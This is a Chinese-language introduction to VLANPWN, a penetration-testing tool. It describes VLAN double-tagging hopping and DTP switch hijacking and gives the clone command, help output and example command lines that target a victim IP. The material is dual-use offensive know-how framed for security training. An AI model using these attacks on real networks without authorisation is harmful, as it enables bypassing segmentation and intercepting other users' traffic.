![](https://image.3001.net/images/20220906/1662419949_631683ed9b72fed30c1c6.jpeg!small)

## 关于VLANPWN

VLANPWN是一款针对VLAN的安全研究和渗透测试工具，该工具可以帮助广大研究人员通过对VLAN执行渗透测试，来研究和分析目标VLAN的安全状况。该工具专为红队研究人员和安全学习爱好者设计，旨在训练网络工程师提升网络的安全性能，请不要将其用于恶意目的。

## 工具核心脚本

>  **DoubleTagging.py** ：该脚本旨在执行一次VLAN
> Hopping攻击（跳跃攻击），该脚本将注入一个包含两个802.1Q标签的帧，并发送测试目的的ICMAP请求。
>
>  
>
>
>  **DTPHijacking.py**
> ：该脚本用于执行一次DTP交换机欺骗/劫持攻击，该脚本将发送一个恶意的DTP帧，此时会将测试人员的设备变成主干信道。接下来，我们就可以尝试绕过VLAN网络的分段，并查看VLAN网络中的所有流量数据了。

## 工具下载

由于该工具基于Python开发，因此我们首先需要在本地设备上安装并配置好Python环境。接下来，使用下列命令将该项目源码克隆至本地：

    
    
    git clone https://github.com/in9uz/VLANPWN.git

## 工具帮助

### DoubleTagging.py使用帮助

    
    
    python3 DoubleTagging.py --help
    
     
    
    .s    s.  .s        .s5SSSs.  .s    s.  .s5SSSs.  .s s.  s.  .s    s.
    
                    SS.       SS.       SS.    SS. SS.       SS.
    
    sS    S%S sS        sS    S%S sSs.  S%S sS    S%S sS S%S S%S sSs.  S%S
    
    SS    S%S SS        SS    S%S SS`S. S%S SS    S%S SS S%S S%S SS`S. S%S
    
    SS    S%S SS        SSSs. S%S SS `S.S%S SS .sS::' SS S%S S%S SS `S.S%S
    
     SS   S%S SS        SS    S%S SS  `sS%S SS        SS S%S S%S SS  `sS%S
    
     SS   `:; SS        SS    `:; SS    `:; SS        SS `:; `:; SS    `:;
    
      SS  ;,. SS    ;,. SS    ;,. SS    ;,. SS        SS ;,. ;,. SS    ;,.
    
       `:;;:' `:;;;;;:' :;    ;:' :;    ;:' `:        `:;;:'`::' :;    ;:'
    
     
    
    VLAN Double Tagging inject tool. Jump into another VLAN!
    
     
    
    Author: Magama Bazarov, <in9uz@protonmail.com>
    
     
    
    usage: DoubleTagging.py [-h] --interface INTERFACE --nativevlan NATIVEVLAN --targetvlan TARGETVLAN --victim VICTIM --attacker ATTACKER
    
     
    
    options:
    
      -h, --help             显示帮助信息和退出
    
      --interface INTERFACE
    
                           指定你的网络接口
    
      --nativevlan NATIVEVLAN
    
                            指定本地VLAN ID
    
      --targetvlan TARGETVLAN
    
                            指定待测试的目标VLAN ID
    
      --victim VICTIM        指定目标IP
    
      --attacker ATTACKER   指定攻击者IP

### DTPHijacking.py使用帮助

    
    
    python3 DTPHijacking.py --help
    
     
    
    .s    s.  .s        .s5SSSs.  .s    s.  .s5SSSs.  .s s.  s.  .s    s.
    
                    SS.       SS.       SS.    SS. SS.       SS.
    
    sS    S%S sS        sS    S%S sSs.  S%S sS    S%S sS S%S S%S sSs.  S%S
    
    SS    S%S SS        SS    S%S SS`S. S%S SS    S%S SS S%S S%S SS`S. S%S
    
    SS    S%S SS        SSSs. S%S SS `S.S%S SS .sS::' SS S%S S%S SS `S.S%S
    
    SS   S%S SS        SS    S%S SS  `sS%S SS        SS S%S S%S SS  `sS%S
    
    SS   `:; SS        SS    `:; SS    `:; SS        SS `:; `:; SS    `:;
    
    SS  ;,. SS    ;,. SS    ;,. SS    ;,. SS        SS ;,. ;,. SS    ;,.
    
     `:;;:' `:;;;;;:' :;    ;:' :;    ;:' `:        `:;;:'`::' :;    ;:'
    
     
    
    DTP Switch Hijacking tool. Become a trunk!
    
     
    
    Author: Magama Bazarov, <in9uz@protonmail.com>
    
     
    
    usage: DTPHijacking.py [-h] --interface INTERFACE
    
     
    
    options:
    
    -h, --help            显示帮助信息和退出
    
    --interface INTERFACE
    
                          指定你的网络接口

## 工具使用样例

### 样例一：DoubleTagging.py

    
    
    python3 DoubleTagging.py --interface eth0 --nativevlan 1 --targetvlan 20 --victim 10.10.20.24 --attacker 10.10.10.54

### 样例二：DTPHijacking.py

    
    
    python3 DTPHijacking.py --interface eth0

## 项目地址

 **VLANPWN** ：【[ _GitHub传送门_](https://github.com/in9uz/VLANPWN)】

